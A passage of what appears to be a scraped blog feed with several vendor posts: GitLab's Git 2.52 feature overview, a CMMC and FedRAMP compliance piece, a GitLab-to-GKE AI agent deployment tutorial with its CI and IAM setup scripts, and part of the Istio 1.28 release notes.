years</td>\n</tr>\n</tbody>\n</table>\n<p>&lt;br&gt;&lt;/br&gt;</p>\n<p>Next to the files themselves, we also display which commit last modified each respective file. This information is easy to extract from Git by executing the following command:</p>\n<pre><code class=\"language-shell\">\n$ git log --max-count=1 HEAD -- &lt;filename&gt;\n\n</code></pre>\n<p>While nice and simple, this has a significant catch: Git does not have a way to extract this information for each of these files in a single command. So to get the last commit for all the files in the tree, we'd need to run this command for each file separately. This results in a command pipeline similar to the following:</p>\n<pre><code class=\"language-shell\">\n$ git ls-tree HEAD --name-only | xargs --max-args=1 git log --max-count=1 HEAD --\n\n</code></pre>\n<p>Naturally, this isn't very efficient:</p>\n<ul>\n<li>\n<p>We need to spin up a fresh Git command for each file.</p>\n</li>\n<li>\n<p>Git has to step through history for each file separately.</p>\n</li>\n</ul>\n<p>As a consequence, this whole operation is quite costly and generates significant load for GitLab.</p>\n<p>To overcome these issues, a new Git subcommand <code>git-last-modified(1)</code> has been introduced. This command returns the commit for each file of a given commit:</p>\n<pre><code class=\"language-shell\">\n$ git last-modified HEAD\n\n\ne56f6dcd7b4c90192018e848d0810f091d092913        add-patch.c\n373ad8917beb99dc643b6e7f5c117a294384a57e        advice.h\ne9330ae4b820147c98e723399e9438c8bee60a80        advice.c\n5e2feb5ca692c5c4d39b11e1ffa056911dd7dfd3        alloc.h\n954d33a9757fcfab723a824116902f1eb16e05f7        RelNotes\n4ce0caa7cc27d50ee1bedf1dff03f13be4c54c1f        apply.c\n5d215a7b3eb0a9a69c0cb9aa43dcae956a0aa03e        archive.c\nc50fbb2dd225e7e82abba4380423ae105089f4d7        README.md\n72686d4e5e9a7236b9716368d86fae5bf1ae6156        attr.h\nc2c4138c07ca4d5ffc41ace0bfda0f189d3e262e        archive.h\n5d1344b4973c8ea4904005f3bb51a47334ebb370        abspath.c\n5d1344b4973c8ea4904005f3bb51a47334ebb370        abspath.h\n60ff56f50372c1498718938ef504e744fe011ffb        banned.h\n4960e5c7bdd399e791353bc6c551f09298746f61        alias.h\n2e99b1e383d2da56c81d7ab7dd849e9dab5b7bf0        SECURITY.md\n1e58dba142c673c59fbb9d10aeecf62217d4fc9c        aclocal.m4\n</code></pre>\n<p>The benefit of this is obviously that we only have to execute a single Git process now to derive all of that information. But even more importantly, it only requires us to walk the history once for all files together instead of having to walk it multiple times. This is achieved by:</p>\n<ol>\n<li>\n<p>Start walking the history from the specified commit.</p>\n</li>\n<li>\n<p>For each commit:</p>\n<ol>\n<li>If it doesn't modify any of the paths we're interested in we continue to the next commit.</li>\n<li>If it does, we print the commit ID together with the path. Furthermore, we remove the path from the set of interesting paths.</li>\n</ol>\n</li>\n<li>\n<p>When the list of interesting paths becomes empty we stop.</p>\n</li>\n</ol>\n<p>Gitaly has already been adjusted to use the new command, but the logic is still guarded by a feature flag. Preliminary testing has shown that <code>git-last-modified(1)</code> is in most situations at least twice as fast compared to using <code>git log --max-count=1</code>.</p>\n<p><em>These changes were <a href=\"https://github.com/ttaylorr/git/tree/tb/blame-tree\">originally written</a> by multiple developers from GitHub and were <a href=\"https://lore.kernel.org/git/20250805093358.1791633-1-toon@iotcl.com/\">upstreamed</a> into Git by <a href=\"https://about.gitlab.com/gitlab.com/toon\">Toon Claes</a>.</em></p>\n<h2>git-fast-export(1) and git-fast-import(1) signature-related improvements</h2>\n<p>The <code>git-fast-export(1)</code> and <code>git-fast-import(1)</code> commands are designed to be mostly used by interoperability or history rewriting tools. The goal of interoperability tools is to make Git interact nicely with other software, usually a different version control system, that stores data in a different format than Git. For example <a href=\"https://github.com/frej/fast-export\">hg-fast-export.sh</a> is a “Mercurial to Git converter using git-fast-import.&quot;</p>\n<p>Alternately, history-rewriting tools let users — usually admins — make changes to the history of their repositories that are not possible or not allowed by the version control system. For example, <a href=\"http://www.catb.org/esr/reposurgeon/\">reposurgeon</a> says in its <a href=\"https://gitlab.com/esr/reposurgeon/-/blob/master/repository-editing.adoc?ref_type=heads#introduction\">introduction</a> that its purpose is “to enable risky operations that version-control systems don't want to let you do, such as (a) editing past comments and metadata, (b) excising commits, (c) coalescing and splitting commits, (d) removing files and subtrees from repo history, (e) merging or grafting two or more repos, and (f) cutting a repo in two by cutting a parent-child link, preserving the branch structure of both child repos.&quot;</p>\n<p>Within GitLab, we use <a href=\"https://github.com/newren/git-filter-repo\">git-filter-repo</a> to let admins perform some risky operations on their Git repositories. Unfortunately, until Git 2.50 (released last June), both <code>git-fast-export(1)</code> and <code>git-fast-import(1)</code> didn't handle cryptographic commit signatures at all. So, although <code>git-fast-export(1)</code> had a <code>--signed-tags=&lt;mode&gt;</code> option that allows users to change how cryptographic tag signatures are handled, commit signatures were simply ignored.</p>\n<p>Cryptographic signatures are very fragile because they are based on the exact commit or tag data that was signed. When the signed data or any of its preceding history changes, the cryptographic signature becomes invalid. This is a fragile but necessary requirement to make these signatures useful.</p>\n<p>But in the context of rewriting history this is a problem:</p>\n<ul>\n<li>\n<p>We may want to keep cryptographic signatures for both commits and tags that are still valid after the rewrite (e.g. because the history leading up to them did not change).</p>\n</li>\n<li>\n<p>We may want to create new cryptographic signatures for commits and tags where the previous signature has become invalid.</p>\n</li>\n</ul>\n<p>Neither <code>git-fast-import(1)</code> nor <code>git-fast-export(1)</code> allow for these use cases though, which limits what tools like <a href=\"https://github.com/newren/git-filter-repo\">git-filter-repo</a> or <a href=\"http://www.catb.org/esr/reposurgeon/\">reposurgeon</a> can achieve.</p>\n<p>We have made some significant progress:</p>\n<ul>\n<li>\n<p>In Git 2.50 we added a <code>--signed-commits=&lt;mode&gt;</code> option to <code>git-fast-export(1)</code> for exporting commit signatures, and support in <code>git-fast-import(1)</code> for importing them.</p>\n</li>\n<li>\n<p>In Git 2.51 we improved the format used for exporting and importing commit signatures, and we made it possible for <code>git-fast-import(1)</code> to import both a signature made on the SHA-1 object ID of the commit and one made on its SHA-256 object ID.</p>\n</li>\n<li>\n<p>In Git 2.52 we added the <code>--signed-commits=&lt;mode&gt;</code> and <code>--signed-tags=&lt;mode&gt;</code> options to <code>git-fast-import(1)</code>, so the user has control over how to handle signed data at import time.</p>\n</li>\n</ul>\n<p>There is still more to be done. We need to add the ability to:</p>\n<ul>\n<li>\n<p>Retain only those commit signatures that are still valid to <code>git-fast-import(1)</code>.</p>\n</li>\n<li>\n<p>Re-sign data where the signature became invalid.</p>\n</li>\n</ul>\n<p>We have already started to work on these next steps and expect this to land in Git 2.53. Once done, tools like <code>git-filter-repo(1)</code> will finally start to handle cryptographic signatures more gracefully. We will keep you posted in our next Git release blog post.</p>\n<p><em>This project was led by <a href=\"https://gitlab.com/chriscool\">Christian Couder</a>.</em></p>\n<h2>New and improved git-maintenance(1) strategies</h2>\n<p>Git repositories require regular maintenance to ensure that they perform well. This maintenance performs a bunch of different tasks: references get optimized, objects get compressed, and stale data gets pruned.</p>\n<p>Until Git 2.28, these maintenance tasks were performed by <code>git-gc(1)</code>. The problem with this command is that it wasn't built with customizability in mind: While certain parameters can be configured, it is not possible to control which parts of a repository should be optimized. This means that it may not be a good fit for all use cases. Even more importantly, it made it very hard to iterate on how exactly Git performs repository maintenance.</p>\n<p>To fix this issue and allow us to iterate again, <a href=\"https://github.com/derrickstolee\">Derrick Stolee</a> introduced <code>git-maintenance(1)</code>. In contrast to <code>git-gc(1),</code> it is built with customizability in mind and allows the user to configure which tasks specifically should be running in a certain repository. This new tool was made the default for Git’s automated maintenance in Git 2.29, but, by default, it still uses <code>git-gc(1)</code> to perform the maintenance.</p>\n<p>While this default maintenance strategy works well in small or even medium-sized repositories, it is problematic in the context of large monorepos. The biggest limiting factor is how <code>git-gc(1)</code> repacks objects: Whenever there are more than 50 packfiles, the tool will merge all of them together into a single packfile. This operation is quite CPU-intensive and causes a lot of I/O operations, so for large monorepos this operation can easily take many minutes or even hours to complete.</p>\n<p>Git already knows how to minimize these repacks via “geometric repacking.” The idea is simple: The packfiles that exist in the repository must follow a geometric progression where every packfile must contain at least twice as many objects as the next smaller one. This allows Git to amortize the number of repacks required while still ensuring that there is only a relatively small number of packfiles overall. This mode was introduced by <a href=\"https://github.com/ttaylorr\">Taylor Blau</a> in Git 2.32, but it was not wired up as part of the automated maintenance.</p>\n<p>All the parts exist to make repository maintenance way more scalable for large monorepos: We have the flexible <code>git-maintenance(1)</code> tool that can be extended to have a new maintenance strategy, and we have a better way to repack objects. All that needs to be done is to combine these two.</p>\n<p>And that's exactly what we did with Git 2.52! We have introduced a new “geometric” maintenance strategy that you can configure in your Git repositories. This strategy is intended as a full replacement for the old strategy based on <code>git-gc(1)</code>. Here is the config code you need:</p>\n<pre><code class=\"language-shell\">\n$ git config set maintenance.strategy geometric\n\n</code></pre>\n<p>From hereon, Git will use geometric repacking to optimize your objects. This should lead to less churn while ensuring that your objects are in a better-optimized state, especially in large monorepos.</p>\n<p>In Git 2.53, we aim to make this the default strategy. So stay tuned!</p>\n<p><em>This project was led by <a href=\"https://gitlab.com/pks-gitlab\">Patrick Steinhardt</a>.</em></p>\n<h2>New subcommand for git-repo(1) to display repository metrics</h2>\n<p>Performance of Git operations in a repository are often dependent on certain characteristics of its underlying structure. At GitLab, we host some extremely large repositories and having insight into the general structure of a repository is critical to understand performance. While it is possible to compose various Git commands and other tools together to surface certain repository metrics, Git lacks a means to surface info about a repository's shape/structure via a single command. This has led to the development of other external tools, such as <a href=\"https://github.com/github/git-sizer\">git-sizer(1)</a>, to fill this gap.</p>\n<p>With the release of Git 2.52, a new “structure” subcommand has been added to git-repo(1) with the aim to surface information about a repository's structure. Currently, it displays info about the number of references and objects in the repository in the following form:</p>\n<pre><code class=\"language-shell\">\n$ git repo structure\n\n\n| Repository structure | Value  |\n| -------------------- | ------ |\n| * References         |        |\n|   * Count            |   1772 |\n|     * Branches       |      3 |\n|     * Tags           |   1025 |\n|     * Remotes        |    744 |\n|     * Others         |      0 |\n|                      |        |\n| * Reachable objects  |        |\n|   * Count            | 418958 |\n|     * Commits        |  87468 |\n|     * Trees          | 168866 |\n|     * Blobs          | 161632 |\n|     * Tags           |    992 |\n\n</code></pre>\n<p>In subsequent releases we hope to expand on this and provide other interesting data points like the largest objects in the repository.</p>\n<p><em>This project was led by <a href=\"https://gitlab.com/justintobler\">Justin Tobler</a>.</em></p>\n<h2>Improvements related to the Google Summer of Code 2025</h2>\n<p>We had three successful projects with the Google Summer of Code.</p>\n<h3>Refactoring in order to reduce Git's global state</h3>\n<p>Git contains several global variables used throughout the codebase. This increases the complexity of the code and reduces the maintainability. As part of this project, <a href=\"https://ayu-ch.github.io/\">Ayush Chandekar</a> worked on reducing the usage of the <code>the_repository</code> global variable via a series of patches.</p>\n<p><em>The project was mentored by <a href=\"https://gitlab.com/chriscool\">Christian Couder</a> and <a href=\"https://in.linkedin.com/in/ghanshyam-thakkar\">Ghanshyam Thakkar</a>.</em></p>\n<h3>Machine-readable Repository Information Query Tool</h3>\n<p>Git lacks a centralized way to retrieve repository information, requiring users to piece it together from various commands. While <code>git-rev-parse(1)</code> has become the de-facto tool for accessing much of this information, doing so falls outside its primary purpose.</p>\n<p>As part of this project, <a href=\"https://lucasoshiro.github.io/en/\">Lucas Oshiro</a> introduced a new command, <code>git-repo(1),</code> which will house all repository-level information. Users can now use <code>git repo info</code> to obtain repository information:</p>\n<pre><code class=\"language-shell\">\n$ git repo info layout.bare layout.shallow object.format references.format\n\nlayout.bare=false\nlayout.shallow=false\nobject.format=sha1\nreferences.format=reftable\n\n</code></pre>\n<p><em>The project was mentored by <a href=\"https://gitlab.com/pks-gitlab\">Patrick Steinhardt</a> and <a href=\"https://gitlab.com/knayakgl\">Karthik Nayak</a>.</em></p>\n<h3>Consolidate ref-related functionality into git-refs</h3>\n<p>Git offers multiple commands for managing references, namely <code>git-for-each-ref(1)</code>, <code>git show-ref(1)</code>, <code>git-update-ref(1)</code>, and <code>git-pack-refs(1)</code>. This makes them harder to discover and creates overlapping functionality. To address this, we introduced the <code>git-refs(1)</code> command to consolidate these operations under a single interface. As part of this this project, <a href=\"https://inosmeet.github.io/\">Meet Soni</a> extended the command by adding the following subcommands:</p>\n<ul>\n<li>\n<p><code>git refs optimize</code> to optimize the reference backend</p>\n</li>\n<li>\n<p><code>git refs list</code> to list all references</p>\n</li>\n<li>\n<p><code>git refs exists</code> to verify the existence of a reference</p>\n</li>\n</ul>\n<p><em>The project was mentored by <a href=\"https://gitlab.com/pks-gitlab\">Patrick Steinhardt</a> and <a href=\"https://luolibrary.com/\">shejialuo</a>.</em></p>\n<h2>What's next?</h2>\n<p>Ready to experience these improvements? Update to Git 2.52.0 and start using <code>git last-modified</code>.</p>\n<p>At GitLab, we will of course ensure that all of these improvements will eventually land in a GitLab instance near you!</p>\n<p>Learn more in the <a href=\"https://lore.kernel.org/git/xmqqh5usmvsd.fsf@gitster.g/\">official Git 2.52.0 release notes</a> and explore our <a href=\"https://about.gitlab.com/blog/tags/git/\">complete archive of Git development coverage</a>.</p>",

      "summary": "<p>For Defense Industrial Base (DIB) companies, the U.S. Department of Defense's release of the Cybersecurity Maturity Model Certification (CMMC) <a href=\"https://www.federalregister.gov/documents/2025/09/10/2025-17359/defense-federal-acquisition-regulation-supplement-assessing-contractor-implementation-of_\">Final Rule</a> and new guidance on “FedRAMP equivalency” has dramatically increased the cost of compliance and fundamentally changed the way in which they drive their risk management programs. Gone is the era of “self-attestation” of security programs; DIB companies are required to strictly apply NIST 800-171 to their environments that handle Controlled Unclassified Information (CUI), and have their security controls audited by a Third-Party Assessment Organization (3PAO) every three years.</p>\n<p>DIB companies are engineering focused, not compliance driven, and formal audits get pricey quickly. These changes add significant complications for companies focused on supporting the warfighter. The good news? <a href=\"https://about.gitlab.com/press/releases/2025-05-19-gitlab-announces-gitlab-achieves-fedramp-moderate-authorization/\">GitLab Dedicated for Government's FedRAMP Moderate Authorization</a> means DIB companies can directly use GitLab Dedicated for Government with no additional audits or authorizations, which reduces the impact and cost of compliance.</p>\n<h2>The foundational rule: FedRAMP Moderate Equivalency</h2>\n<p>The protection of Controlled Unclassified Information (CUI) within the DIB is driven by a foundational legal and contractual mandate: the Defense Federal Acquisition Regulation Supplement (DFARS) <a href=\"https://www.acquisition.gov/dfars/252.204-7012-safeguarding-covered-defense-information-and-cyber-incident-reporting.\">Clause 252.204-7012</a>. This clause specifically states that if a contractor uses an external cloud service provider to &quot;store, process, or transmit any covered defense information,&quot; that provider must meet security requirements &quot;equivalent to those established by the Government for the FedRAMP Moderate baseline.&quot;</p>\n<p>The DOD's January 2, 2024, memorandum, &quot;<a href=\"https://dodcio.defense.gov/Portals/0/Documents/Library/FEDRAMP-EquivalencyCloudServiceProviders.pdf\">Federal Risk and Authorization Management Program (FedRAMP) Moderate Equivalency for Cloud Service Provider's (CSPs) Cloud Service Offerings</a>&quot; defines “FedRAMP Moderate Equivalency,” and also directly specifies that FedRAMP Moderate Cloud Service Offerings (CSOs) can be used without any additional assessment, such as individual CMMC assessment, to meet equivalency requirements:</p>\n<p>“This memorandum does not apply to CSOs that are FedRAMP Moderate Authorized under the existing FedRAMP process. <strong>FedRAMP Moderate Authorized CSOs identified in the FedRAMP Marketplace</strong> provide the required security to store, process or transmit CDI in accordance with Defense Federal Acquisition Regulations Supplement (DFARS) Clause 252.204-7012, &quot;Safeguarding Covered Defense Information and Cyber Incident Reporting&quot; and <strong>can be leveraged without further assessment to meet the equivalency requirements</strong>.”</p>\n<h2>The GitLab platform: A proven path to compliance</h2>\n<p>GitLab's GovCloud Offering, GitLab Dedicated for Government, <a href=\"https://marketplace.fedramp.gov/products/FR2411959145\">has achieved FedRAMP Moderate Authorization</a>. This means that DIB companies can leverage GitLab Dedicated for Government as their DevSecOps platform immediately and without any additional audits or compliance checks. DIB companies leveraging GitLab Dedicated for Government inherit all of our security controls and our Body of Evidence, shifting the risk and cost of compliance away from themselves and allowing them to focus on their mission.</p>\n<h2>The Shared Responsibility Matrix: Your role as a DIB contractor</h2>\n<p>While a FedRAMP-authorized solution significantly reduces your compliance burden, compliance is a joint effort. You are responsible for the security controls that fall under your purview. This is where the Shared Responsibility Matrix (SRM), also called the Customer Responsibility Matrix (CRM), comes in.</p>\n<p>When you adopt GitLab Dedicated for Government, you will receive a comprehensive SRM that clearly delineates which security controls are managed by GitLab and which are your responsibility as the customer. Your CMMC C3PAO will use this document to ensure you have implemented the necessary controls on your end.

      "summary": "<p>Building <a href=\"https://about.gitlab.com/gitlab-duo/agent-platform/\">AI agents</a> is</p>\n<p>exciting, but deploying them securely to production shouldn't be</p>\n<p>complicated. In this tutorial, you will learn how GitLab's <a href=\"https://cloud.google.com/blog/topics/partners/understand-the-google-cloud-gitlab-integration\">native Google Cloud integration</a> makes it straightforward to deploy AI agents to Google Kubernetes Engine (GKE) — with built-in scanning and zero service account keys.</p>\n<h2>Why choose GKE to deploy your AI agents?</h2>\n<p>GKE provides enterprise-grade orchestration that connects seamlessly with GitLab CI/CD pipelines through OIDC authentication. Your development team can deploy AI agents while maintaining complete visibility, compliance, and control over your cloud infrastructure. This guide uses Google's Agent Development Kit (<a href=\"https://developers.googleblog.com/en/agent-development-kit-easy-to-build-multi-agent-applications/\">ADK</a>) to build the app, so you can expect increased seamlessness as this is deployed using GitLab.</p>\n<p>Three key advantages to this approach:</p>\n<p><strong>Full infrastructure control</strong> - Your data, your rules, your environment. You maintain complete control over where your AI agents run and how they're configured.</p>\n<p><strong>Native GitLab integration</strong> - No complex workarounds. Your existing pipelines work right out of the box thanks to GitLab's native integration with Google Cloud.</p>\n<p><strong>Production-grade scaling</strong> - GKE automatically handles the heavy lifting of scaling and internal orchestration as your AI workloads grow.</p>\n<p>The key point is that GitLab with GKE provides the enterprise reliability your AI deployments demand without sacrificing the developer experience your teams expect.</p>\n<h2>Prerequisites</h2>\n<p>Before you start, make sure you have these APIs enabled:</p>\n<ul>\n<li>\n<p>GKE API</p>\n</li>\n<li>\n<p>Artifact Registry API</p>\n</li>\n<li>\n<p>Vertex AI API</p>\n</li>\n</ul>\n<p>Also make sure you have:</p>\n<ul>\n<li>\n<p>GitLab project created</p>\n</li>\n<li>\n<p>GKE cluster provisioned</p>\n</li>\n<li>\n<p>Artifact Registry repository created</p>\n</li>\n</ul>\n<h2>The deployment process</h2>\n<h3>1. Set up IAM and permissions on GitLab</h3>\n<p>Navigate to your GitLab integrations to configure Google Cloud authentication (IAM).</p>\n<p>Go to <strong>Settings &gt; Integrations</strong> and configure the Google Cloud integration. If you're using a group-level integration, notice that default settings are already inherited by projects. This means you configure once at the group level, and all projects benefit and inherit this setting.</p>\n<p>To set this up from scratch, provide:</p>\n<ul>\n<li>\n<p>Project ID</p>\n</li>\n<li>\n<p>Project Number</p>\n</li>\n<li>\n<p>Workload Identity Pool ID</p>\n</li>\n<li>\n<p>Provider ID</p>\n</li>\n</ul>\n<p>Once configured, GitLab provides a script to run in Google Cloud Console, via Cloud Shell. The outcome of running this script is a Workload Identity Federation pool with the necessary service principal to enable the proper access.</p>\n<h3>2. Configure Artifact Registry integration</h3>\n<p>Still in GitLab's integration settings, configure Artifact Management:</p>\n<ol>\n<li>\n<p>Click <strong>Artifact Management</strong>.</p>\n</li>\n<li>\n<p>Select <strong>Google Artifact Registry</strong>.</p>\n</li>\n<li>\n<p>Provide:</p>\n<ul>\n<li>Project ID</li>\n<li>Repository Name (created beforehand)</li>\n<li>Repository Location</li>\n</ul>\n</li>\n</ol>\n<p>GitLab provides another script to run in Google Cloud Console.</p>\n<p><strong>Important:</strong> Before proceeding, add these extra roles to the Workload Identity Federation pool:</p>\n<ul>\n<li>\n<p>Service Account User</p>\n</li>\n<li>\n<p>Kubernetes Developer</p>\n</li>\n<li>\n<p>Kubernetes Cluster Viewer</p>\n</li>\n</ul>\n<p>These permissions allow GitLab to deploy to GKE in subsequent steps.</p>\n<h3>3. Create the CI/CD pipeline</h3>\n<p>Now for the key part — creating the CI/CD pipeline for deployment.</p>\n<p>Head to <strong>Build &gt; Pipeline Editor</strong> and define your pipeline with four stages:</p>\n<ul>\n<li>\n<p><strong>Build</strong> - Docker creates the container image.</p>\n</li>\n<li>\n<p><strong>Test</strong> - GitLab Auto DevOps provides built-in security scans to ensure there are no vulnerabilities.</p>\n</li>\n<li>\n<p><strong>Upload</strong> - Uses GitLab's built-in CI/CD component to push to Google Artifact Registry.</p>\n</li>\n<li>\n<p><strong>Deploy</strong> - Uses Kubernetes configuration to deploy to GKE.</p>\n</li>\n</ul>\n<p>Here's the complete <code>.gitlab-ci.yml</code>:</p>\n<pre><code class=\"language-yaml\">\n\ndefault:\n  tags: [ saas-linux-2xlarge-amd64 ]\n\nstages:\n  - build\n  - test\n  - upload\n  - deploy\n\nvariables:\n  GITLAB_IMAGE: $CI_REGISTRY_IMAGE/main:$CI_COMMIT_SHORT_SHA\n  AR_IMAGE: $GOOGLE_ARTIFACT_REGISTRY_REPOSITORY_LOCATION-docker.pkg.dev/$GOOGLE_ARTIFACT_REGISTRY_PROJECT_ID/$GOOGLE_ARTIFACT_REGISTRY_REPOSITORY_NAME/main:$CI_COMMIT_SHORT_SHA\n  GCP_PROJECT_ID: &quot;your-project-id&quot;\n  GKE_CLUSTER: &quot;your-cluster&quot;\n  GKE_REGION: &quot;us-central1&quot;\n  KSA_NAME: &quot;ai-agent-ksa&quot;\n\nbuild:\n  image: docker:24.0.5\n  stage: build\n  services:\n    - docker:24.0.5-dind\n  before_script:\n    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY\n  script:\n    - docker build -t $GITLAB_IMAGE .\n    - docker push $GITLAB_IMAGE\n\ninclude:\n  - template: Jobs/Dependency-Scanning.gitlab-ci.yml\n  - template: Jobs/Container-Scanning.gitlab-ci.yml\n  - template: Jobs/Secret-Detection.gitlab-ci.yml\n  - component: gitlab.com/google-gitlab-components/artifact-registry/upload-artifact-registry@main\n    inputs:\n      stage: upload\n      source: $GITLAB_IMAGE\n      target: $AR_IMAGE\n\ndeploy:\n  stage: deploy\n  image: google/cloud-sdk:slim\n  identity: google_cloud\n  before_script:\n    - apt-get update &amp;&amp; apt-get install -y kubectl google-cloud-sdk-gke-gcloud-auth-plugin\n    - gcloud container clusters get-credentials $GKE_CLUSTER --region $GKE_REGION --project $GCP_PROJECT_ID\n  script:\n    - |\n      kubectl apply -f - &lt;&lt;EOF\n      apiVersion: apps/v1\n      kind: Deployment\n      metadata:\n        name: ai-agent\n        namespace: default\n      spec:\n        replicas: 2\n        selector:\n          matchLabels:\n            app: ai-agent\n        template:\n          metadata:\n            labels:\n              app: ai-agent\n          spec:\n            serviceAccountName: $KSA_NAME\n            containers:\n            - name: ai-agent\n              image: $AR_IMAGE\n              ports:\n              - containerPort: 8080\n              resources:\n                requests: {cpu: 500m, memory: 1Gi}\n                limits: {cpu: 2000m, memory: 4Gi}\n              livenessProbe:\n                httpGet: {path: /health, port: 8080}\n                initialDelaySeconds: 60\n              readinessProbe:\n                httpGet: {path: /health, port: 8080}\n                initialDelaySeconds: 30\n      ---\n      apiVersion: v1\n      kind: Service\n      metadata:\n        name: ai-agent-service\n        namespace: default\n      spec:\n        type: LoadBalancer\n        ports:\n        - port: 80\n          targetPort: 8080\n        selector:\n          app: ai-agent\n      ---\n      apiVersion: autoscaling/v2\n      kind: HorizontalPodAutoscaler\n      metadata:\n        name: ai-agent-hpa\n        namespace: default\n      spec:\n        scaleTargetRef:\n          apiVersion: apps/v1\n          kind: Deployment\n          name: ai-agent\n        minReplicas: 2\n        maxReplicas: 10\n        metrics:\n        - type: Resource\n          resource:\n            name: cpu\n            target: {type: Utilization, averageUtilization: 70}\n      EOF\n      \n      kubectl rollout status deployment/ai-agent -n default --timeout=5m\n      EXTERNAL_IP=$(kubectl get service ai-agent-service -n default -o jsonpath='{.status.loadBalancer.ingress[0].ip}')\n      echo &quot;Deployed at: http://$EXTERNAL_IP&quot;\n  only:\n    - main\n</code></pre>\n<h4>The critical configuration for GKE</h4>\n<p>What makes this work — and why we need this extra configuration for GKE— is that we must have a Kubernetes Service Account in the cluster that can work with Vertex AI. We need that service account to be permitted to access the AI capabilities of Google Cloud.</p>\n<p>Without this, we can deploy the application, but the AI agent won't work. We need to create a Kubernetes Service Account that can access Vertex AI.</p>\n<p>Run this one-time setup:</p>\n<pre><code class=\"language-bash\">\n\n#!/bin/bash\n\n\nPROJECT_ID=&quot;your-project-id&quot;\n\n\nGSA_NAME=&quot;ai-agent-vertex&quot;\n\n\nGSA_EMAIL=&quot;${GSA_NAME}@${PROJECT_ID}.iam.gserviceaccount.com&quot;\n\n\nKSA_NAME=&quot;ai-agent-ksa&quot;\n\n\nCLUSTER_NAME=&quot;your-cluster&quot;\n\n\nREGION=&quot;us-central1&quot;\n\n\n\n# Create GCP Service Account\n\n\ngcloud iam service-accounts create $GSA_NAME \\\n    --display-name=&quot;AI Agent Vertex AI&quot; \\\n    --project=$PROJECT_ID\n\n# Grant Vertex AI permissions\n\n\ngcloud projects add-iam-policy-binding $PROJECT_ID \\\n    --member=&quot;serviceAccount:${GSA_EMAIL}&quot; \\\n    --role=&quot;roles/aiplatform.user&quot;\n\n# Get cluster credentials\n\n\ngcloud container clusters get-credentials $CLUSTER_NAME \\\n    --region $REGION --project $PROJECT_ID\n\n# Create Kubernetes Service Account\n\n\nkubectl create serviceaccount $KSA_NAME -n default\n\n\n\n# Link accounts\n\n\nkubectl annotate serviceaccount $KSA_NAME -n default \\\n    iam.gke.io/gcp-service-account=${GSA_EMAIL}\n\ngcloud iam service-accounts add-iam-policy-binding ${GSA_EMAIL} \\\n    --role=roles/iam.workloadIdentityUser \\\n    --member=&quot;serviceAccount:${PROJECT_ID}.svc.id.goog[default/${KSA_NAME}]&quot; \\\n    --project=$PROJECT_ID\n</code></pre>\n<h3>4. Deploy to GKE</h3>\n<p>Once you're done, push this change to the pipeline and you're good to go.</p>\n<p>You can see the pipeline has just deployed. Go to <strong>CI/CD &gt; Pipelines</strong> and you'll see the four stages:</p>\n<ul>\n<li>\n<p>Build</p>\n</li>\n<li>\n<p>Test (with all defined security scans)</p>\n</li>\n<li>\n<p>Upload to Artifact Registry (successful)</p>\n</li>\n<li>\n<p>Deploy to Kubernetes in GKE (success)</p>\n</li>\n</ul>\n<h2>Summary</h2>\n<p>With GitLab and Google Cloud together, you're able to deploy your AI agent to GKE with ease and security. We didn't have to go through a lot of steps — we were able to do that thanks to GitLab's native integration with Google Cloud.</p>\n<p>Watch this demo:</p>\n<p>&lt;!-- blank line --&gt;</p>\n<p>&lt;figure class=&quot;video_container&quot;&gt;\n&lt;iframe src=&quot;https://www.youtube.com/embed/mc2pCL5Qjus?si=QoH02lvz5KH5Ku9O&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;true&quot;&gt; &lt;/iframe&gt;\n&lt;/figure&gt;</p>\n<p>&lt;!-- blank line --&gt;</p>\n<blockquote>\n<p>Use this tutorial's <a href=\"https://gitlab.com/gitlab-partners-public/google-cloud/demos/gke-ai-agent\">complete code example</a> to get started now.

</aside>\n</div>\n\n<h2 id=\"whats-new\">What’s new?</h2>\n<h3 id=\"inference-extension-support\">Inference Extension Support</h3>\n<p>Istio 1.28 continues to build on the Gateway API Inference Extension support with the introduction of <code>InferencePool</code> v1. This enhancement provides better management and routing of AI inference workloads, making it easier to deploy and scale Generative AI models on Kubernetes with intelligent traffic management.</p>\n<p>The <code>InferencePool</code> v1 API offers improved stability and functionality for managing pools of inference endpoints, enabling more sophisticated load balancing and failover strategies for AI workloads.</p>\n<h3 id=\"ambient-multicluster\">Ambient Multicluster</h3>\n<p>Istio 1.28 brings significant improvements to ambient multicluster deployments. Waypoints can now route traffic to remote networks in ambient multicluster configurations, expanding ambient capabilities. This enhancement enables outlier detection and other L7 policies for requests crossing networks, making it easier to manage multi-network service mesh deployments.</p>\n<p>Ambient multicluster remains an alpha feature and there are several known issues that will be addressed in future releases. If the recent changes negatively impacted your ambient multicluster deployment, it&rsquo;s possible to disable the recent waypoint behavior change by setting <code>AMBIENT_ENABLE_MULTI_NETWORK_WAYPOINT</code> pilot environment variable to <code>false</code>.</p>\n<p>We welcome feedback and bug reports from early adopters of ambient multicluster.</p>\n<h3 id=\"native-nftables-support-in-ambient-mode\">Native nftables Support in Ambient Mode</h3>\n<p>Istio 1.28 introduces support for native nftables when using ambient mode. This significant enhancement allows you to use nftables instead of iptables to manage network rules, providing a more flexible rule management.

      "summary": "<h2 id=\"traffic-management\">Traffic Management</h2>\n<ul>\n<li>\n<p><strong>Promoted</strong> Istio dual-stack support to beta.\n(<a href=\"https://github.com/istio/istio/issues/54127\">Issue #54127</a>)</p>\n</li>\n<li>\n<p><strong>Updated</strong> the default value for maximum accepted connections per socket event. The\ndefault value now is 1 for inbound and outbound listeners explicitly binding to ports\nin sidecars. Listeners with no iptables interception will benefit from better performance\nunder high connection churn scenarios. To get the old behavior, you can set <code>MAX_CONNECTIONS_PER_SOCKET_EVENT_LOOP</code>\nto zero.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for cookie attributes in consistent hash load-balancing. You can now specify additional attributes, such as <code>SameSite</code>, <code>Secure</code> and <code>HttpOnly</code>. This allows for more secure and compliant cookie handling in load-balancing scenarios.\n(<a href=\"https://github.com/istio/istio/issues/56468\">Issue #56468</a>), (<a href=\"https://github.com/istio/istio/issues/49870\">Issue #49870</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> <code>DISABLE_SHADOW_HOST_SUFFIX</code> environment variable to control shadow host suffix behavior in mirroring policies. When set to <code>true</code> (default), shadow host suffixes are added to hostnames of mirrored requests. When set to <code>false</code>, shadow host suffixes are not added. This provides backward compatibility for users upgrading from older Istio versions where shadow host suffixes were added by default via compatibility profiles.\n(<a href=\"https://github.com/istio/istio/issues/57530\">Issue 